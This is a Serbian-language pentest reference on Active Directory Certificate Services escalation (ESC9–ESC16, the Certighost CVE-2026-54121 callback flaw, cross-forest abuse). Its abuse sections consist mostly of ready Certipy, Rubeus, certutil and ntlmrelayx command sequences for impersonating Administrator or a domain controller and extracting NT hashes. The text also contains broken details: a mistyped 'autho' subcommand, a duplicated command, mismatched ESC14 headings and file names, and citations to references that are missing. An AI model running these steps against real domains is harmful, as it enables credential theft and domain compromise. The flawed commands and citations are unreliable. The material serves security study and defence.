[*] Exiting...
```
## Bez bezbednosne ekstenzije - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, označena kao ESC9, sprečava ugrađivanje **nove bezbednosne ekstenzije `szOID_NTDS_CA_SECURITY_EXT`** u sertifikat. Ova zastavica postaje relevantna kada je `StrongCertificateBindingEnforcement` podešen na `1` (podrazumevana postavka), za razliku od postavke `2`. Njena relevantnost je veća u scenarijima u kojima bi slabije mapiranje sertifikata za Kerberos ili Schannel moglo biti iskorišćeno (kao kod ESC10), jer odsustvo ESC9 ne bi promenilo zahteve.<sup>[[7]](#references)</sup>

Uslovi pod kojima podešavanje ove zastavice postaje značajno uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`) ili `CertificateMappingMethods` uključuje zastavicu `UPN`.
- Sertifikat ima zastavicu `CT_FLAG_NO_SECURITY_EXTENSION` unutar postavke `msPKI-Enrollment-Flag`.
- Sertifikat navodi bilo koji EKU za client authentication.
- Dostupne su `GenericWrite` dozvole nad bilo kojim nalogom koji treba kompromitovati.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, sa ciljem kompromitovanja naloga `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji `Jane@corp.local` ima dozvolu za enrollment, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u svojoj postavci `msPKI-Enrollment-Flag`.

Najpre se hash naloga `Jane` dobija pomoću Shadow Credentials, zahvaljujući `GenericWrite` dozvolama koje ima `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `userPrincipalName` naloga `Jane` se menja u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, s obzirom na to da `Administrator@corp.local` ostaje različit kao `userPrincipalName` naloga `Administrator`.

Nakon toga, ranjivi template sertifikata `ESC9` zahteva se kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Napominje se da sertifikatov `userPrincipalName` odražava `Administrator`, bez ikakvog „object SID“-a.

`userPrincipalName` korisnice `Jane` se zatim vraća na njenu prvobitnu vrednost, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentikacije pomoću izdatog sertifikata sada daje NT hash naloga `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` jer sertifikat ne navodi domen:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

Dve vrednosti registarskih ključeva na domain controller-u označene su kao ESC10:

- Podrazumevana vrednost za `CertificateMappingMethods` u okviru `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` iznosi `0x18` (`0x8 | 0x10`), dok je ranije bila postavljena na `0x1F`.
- Podrazumevana postavka za `StrongCertificateBindingEnforcement` u okviru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` iznosi `1`, dok je ranije bila `0`.<sup>[[7]](#references)</sup>

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Abuse Case 1

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`, nalog A sa `GenericWrite` dozvolama može se iskoristiti za kompromitovanje bilo kog naloga B.

Na primer, ako napadač ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, cilj mu je kompromitovanje naloga `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava korišćenje bilo kog certificate template-a.

Najpre se hash naloga `Jane` preuzima pomoću Shadow Credentials, iskorišćavanjem dozvole `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` naloga `Jane` menja se u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, sertifikat koji omogućava autentifikaciju klijenta zahteva se kao `Jane`, koristeći podrazumevani predložak `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Authentifikacija pomoću dobijenog sertifikata će otkriti NT hash korisnika `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva podataka o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Kada `CertificateMappingMethods` sadrži bit zastavicu `UPN` (`0x4`), nalog A sa dozvolama `GenericWrite` može kompromitovati bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući naloge računara i ugrađeni administrator domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` putem Shadow Credentials, uz korišćenje dozvole `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentifikaciju klijenta zahteva se kao `Jane` korišćenjem podrazumevanog шабlona `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` vraća se na prvobitnu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel-a koristi se Certipy opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što je `set_rbcd` omogućavaju napade Resource-Based Constrained Delegation (RBCD), što potencijalno može dovesti do kompromitovanja domain controller-a.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na svaki korisnički nalog kojem nedostaje `userPrincipalName` ili se on ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i činjenice da mu `userPrincipalName` podrazumevano nedostaje.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, NTLM relay attacks mogu da se izvrše bez potpisivanja putem RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` onemogućen; certipy će prikazati `ESC11` Vulnerabilities.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario zloupotrebe

Potrebno je podesiti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za domain controllers, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administratori mogu podesiti Certificate Authority tako da ga čuva na eksternom uređaju kao što je „Yubico YubiHSM2“.

Ako je USB uređaj povezan sa CA serverom preko USB porta ili preko USB device servera u slučaju da je CA server virtualna mašina, potreban je authentication key (ponekad se naziva i „password“) da bi Key Storage Provider generisao i koristio ključeve u YubiHSM-u.

Ovaj key/password se čuva u registry-ju, u okviru `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, u cleartext obliku.

Reference su dostupne [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Ako je CA private key sačuvan na fizičkom USB uređaju i dobijete shell access, moguće je oporaviti ključ.

Najpre morate pribaviti CA certificate (on je javan), a zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Konačno, koristite certutil komandu `-sign` da biste krivotvorili novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u certificate template. Objekti `msPKI-Enterprise-Oid`, odgovorni za izdavanje politika, mogu se otkriti u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime se sistemu omogućava da autorizuje korisnika koji priloži sertifikat kao da je član grupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Drugim rečima, kada korisnik ima dozvolu za enrolment sertifikata, a sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da biste pronašli OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario zloupotrebe

Pronađite korisničku dozvolu; za to možete koristiti `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu da se upiše u `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede template; dobiće sertifikat sa pravima `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[14]](#references)</sup>

ESC14 se bavi ranjivostima koje nastaju zbog „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nesigurne konfiguracije atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhu autentifikacije. Kada se popune, ova eksplicitna mapiranja mogu nadjačati podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosnu ekstenziju `szOID_NTDS_CA_SECURITY_EXT`.

„Slabo“ mapiranje nastaje kada je vrednost stringa koja se koristi unutar atributa `altSecurityIdentities` za identifikaciju sertifikata preširoka, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu falsifikovati. Ako napadač može da pribavi ili izradi sertifikat čiji se atributi poklapaju sa tako slabo definisanim eksplicitnim mapiranjem privilegovanog naloga, može da koristi taj sertifikat za autentifikaciju kao taj nalog i njegovo impersoniranje.

Primeri potencijalno slabih stringova za mapiranje atributa `altSecurityIdentities` uključuju:

- Mapiranje isključivo na osnovu uobičajenog Subject Common Name-a (CN): npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da pribavi sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Korišćenje previše opštih Issuer Distinguished Name-ova (DN) ili Subject DN-ova bez dodatne kvalifikacije, kao što su konkretni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidljivih obrazaca ili nekriptografskih identifikatora koje bi napadač mogao da ispuni u sertifikatu koji može legitimno da dobije ili falsifikuje (ako je kompromitovao CA ili pronašao ranjiv template kao kod ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapiranje prema punim Issuer i Subject DN vrednostima)
- `X509:<SKI>SubjectKeyIdentifier` (mapiranje prema vrednosti ekstenzije Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapiranje prema serijskom broju, implicitno kvalifikovanom Issuer DN-om) - ovo nije standardni format; obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapiranje prema RFC822 imenu, obično email adresi, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapiranje prema SHA1 hash-u sirovog javnog ključa sertifikata - generalno jako)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora sertifikata koji se koriste u stringu za mapiranje. Čak i kada su na Domain Controller-ima omogućeni jaki režimi vezivanja sertifikata (koji prvenstveno utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS imenima i SID ekstenziji), loše konfigurisan unos `altSecurityIdentities` i dalje može predstavljati direktan put do impersoniranja ako je sama logika mapiranja pogrešna ili previše permisivna.
### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-ju (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut podešen (namerno ili zbog pogrešne konfiguracije), napadači mogu da impersoniraju naloge predstavljanjem sertifikata koji odgovaraju mapiranju.

#### Scenario A: Napadač može da upisuje u `altSecurityIdentities`

**Preduslov**: Napadač ima dozvole za upis u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da mu dodeli tu mogućnost kroz jednu od sledećih dozvola na ciljnom AD objektu:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Cilj ima slabo mapiranje putem X509RFC822 (Email)

- **Preduslov**: Cilj ima slabo X509RFC822 mapiranje u atributu altSecurityIdentities. Napadač može da podesi atribut mail žrtve tako da odgovara X509RFC822 imenu cilja, da enroluje sertifikat kao žrtva i da ga koristi za autentifikaciju kao cilj.

#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Preduslov**: Cilj ima slabo X509IssuerSubject eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim napadač može da enroluje sertifikat kao žrtva i da koristi taj sertifikat za autentifikaciju kao cilj.

#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Preduslov**: Cilj ima slabo X509SubjectOnly eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim napadač može da enroluje sertifikat kao žrtva i da koristi taj sertifikat za autentifikaciju kao cilj.
### konkretne operacije
#### Scenario A

Zatražite sertifikat certificate template-a `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za konkretnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. U nastavku je navod iz originalnog teksta.<sup>[[15]](#references)</sup>

Korišćenjem ugrađenih podrazumevanih certificate templates verzije 1, attacker može da kreira CSR tako da uključi application policies koje imaju prednost u odnosu na konfigurisane Extended Key Usage atribute navedene u template-u. Jedini zahtev su enrollment prava, a ovo se može koristiti za generisanje client authentication, certificate request agent i codesigning certificates pomoću **_WebServer_** template-a.

### Zloupotreba

[Certipy privilege-escalation dokumentacija](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) sadrži detaljnije primere upotrebe.<sup>[[14]](#references)</sup>


Certipy-jeva `find` komanda može pomoći u identifikovanju V1 templates koji su potencijalno podložni ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direktno impersoniranje putem Schannel

**Korak 1: Zatražite sertifikat, ubacujući "Client Authentication" Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 šablon "WebServer" (koji omogućava subject koji navodi enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranljivi V1 template sa opcijom "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN-u radi impersonacije.

**Korak 2: Autentifikujte se putem Schannel-a (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation putem zloupotrebe Enrollment Agent-a

**Korak 1: Zatražite sertifikat iz V1 template-a (sa opcijom "Enrollee supplies subject"), uz ubacivanje "Certificate Request Agent" Application Policy-ja.** Ovaj sertifikat je namenjen napadaču (`attacker@corp.local`) kako bi postao enrollment agent. UPN nije naveden za identitet samog napadača, jer je cilj dobiti mogućnost agent-a.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Dodaje OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite sertifikat „agent“ da zatražite sertifikat u ime ciljnog privilegovanog korisnika.** Ovo je korak sličan ESC3, koji koristi sertifikat iz Koraka 1 kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći „on-behalf-of“ sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario u kojem, ako konfiguracija AD CS ne zahteva uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u sve sertifikate, napadač to može da iskoristi na sledeći način:

1. Zahteva sertifikat **bez SID binding-a**.

2. Koristi ovaj sertifikat za authentication kao bilo koji nalog, na primer za impersonation naloga sa visokim privilegijama (npr. Domain Administrator).

Takođe možete pogledati ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Sledeće je preuzeto sa [ovog linka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknite da biste videli detaljnije metode upotrebe.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (opciono - za vraćanje u prethodno stanje).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve tako da odgovara vrednosti `sAMAccountName` ciljnog administratora.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (Ako je potrebno) Nabavite kredencijale za nalog „žrtve“ (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ iz _bilo kog odgovarajućeg šablona za autentifikaciju klijenta_ (npr. „User“) na CA ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security ekstenziju iz izdatog sertifikata, bez obzira na konkretna podešavanja šablona za ovu ekstenziju. Podesite promenljivu okruženja za Kerberos credential cache (shell komanda):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga „victim“.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Authenticate as the target administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback putanju** u kojoj CA veruje atributima zahteva koje je dostavio requester prilikom određivanja identiteta koji treba da bude upisan u izdati certificate. U javnom PoC-u, kreirani zahtev uključuje:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača koji će CA kontaktirati
- **`rmd`**: **DNS ime ciljnog Domain Controller-a** za impersonaciju

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran pomoću podrazumevanog **`ms-DS-MachineAccountQuota`**), tako da se callback session autentifikuje kao validan domain principal, ali rogue services umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principal-om**, može izdati certificate za **Domain Controller**, iako je session autentifikovan kao machine account pod kontrolom napadača. Zbog toga se ova greška konceptualno razlikuje od **Certifried**: umesto izmene AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke o identitetu tokom CA callback resolution-a**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- Niskoprivilegovani **domain credentials**
- Mogućnost **kreiranja ili ponovne upotrebe computer account-a**
- Mrežna dostupnost sa **CA** do portova pod kontrolom napadača **`389`** i **`445`**
- Vulnerable / unpatched CA request path (Microsoft update od **14. jula 2026.** dodao je **DC validation za `cdc`** i **resolved-SID comparison**)

Dobijeni **`.pfx`** zatim može da se koristi za **PKINIT**, čime se dobijaju **`.ccache`** i, u objavljenom PoC flow-u, **NT hash ciljnog DC-a**, što je obično dovoljno za **potpunu kompromitaciju domena**.

### Zloupotreba

Javni PoC automatizuje čitav chain:<sup>[[1]](#references)</sup>

1. Kreira ili ponovo koristi **machine account** pod kontrolom napadača.
2. Pokreće **rogue LDAP i SMB/LSA listeners** na portovima `389` i `445`.
3. Šalje certificate request koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni **`rmd`**.
4. Omogućava CA-u da se autentifikuje na rogue listeners kao kontrolisani machine account, ali na identity lookups odgovara atributima **ciljnog DC-a**.
5. Prima CA-signed **DC certificate**, a zatim ga koristi za **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP adresu oglašenu u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- PoC zahteva **root** jer vezuje **privilegovane portove** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se sertifikat mapira na nalog **Domain Controller-a**, naknadne radnje mogu uključivati **certificate-based Kerberos auth**, **DCSync** i ponovnu upotrebu pronađenog **machine NT hash-a**.<sup>[[2]](#references)</sup>

## Objašnjenje kompromitovanja šuma pomoću sertifikata u pasivnom glasu

### Narušavanje poverenja između šuma kompromitovanim CA-ovima

Konfiguracija za **cross-forest enrollment** postavlja se relativno jednostavno. **Root CA sertifikat** iz šume resursa administratori **objavljuju u šumama naloga**, a sertifikati **enterprise CA** iz šume resursa **dodaju se u kontejnere `NTAuthCertificates` i AIA u svakoj šumi naloga**. Drugim rečima, ovim rasporedom se CA-u u šumi resursa daje potpuna kontrola nad svim drugim šumama za koje upravlja PKI-em. Ako ovaj CA bude **kompromitovan od strane napadača**, oni bi mogli da **krivotvore** sertifikate za sve korisnike u šumama resursa i naloga, čime bi se narušila bezbednosna granica šume.<sup>[[6]](#references)</sup>

### Dodeljene enrollment privilegije stranim principalima

U okruženjima sa više šuma, potrebno je obratiti pažnju na Enterprise CA-ove koji **objavljuju certificate templates** koji **Authenticated Users ili stranim principalima** (korisnicima/grupama izvan šume kojoj Enterprise CA pripada) omogućavaju **enrollment i prava izmene**.\
Nakon autentikacije preko trust-a, AD dodaje **Authenticated Users SID** u korisnikov token. Zbog toga, ako domen poseduje Enterprise CA sa template-om koji **Authenticated Users grupi omogućava enrollment prava**, korisnik iz druge šume bi potencijalno mogao da se **enroll-uje u template**. Isto tako, ako template **eksplicitno dodeljuje enrollment prava stranom principalu**, time se kreira **cross-forest access-control odnos**, koji principalu iz jedne šume omogućava da se **enroll-uje u template iz druge šume**.

Oba scenarija dovode do **povećanja attack surface-a** iz jedne šume prema drugoj. Napadač bi mogao da iskoristi podešavanja certificate template-a za dobijanje dodatnih privilegija u stranom domenu.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repozitorijum](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Tehnička analiza Certighost-a](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
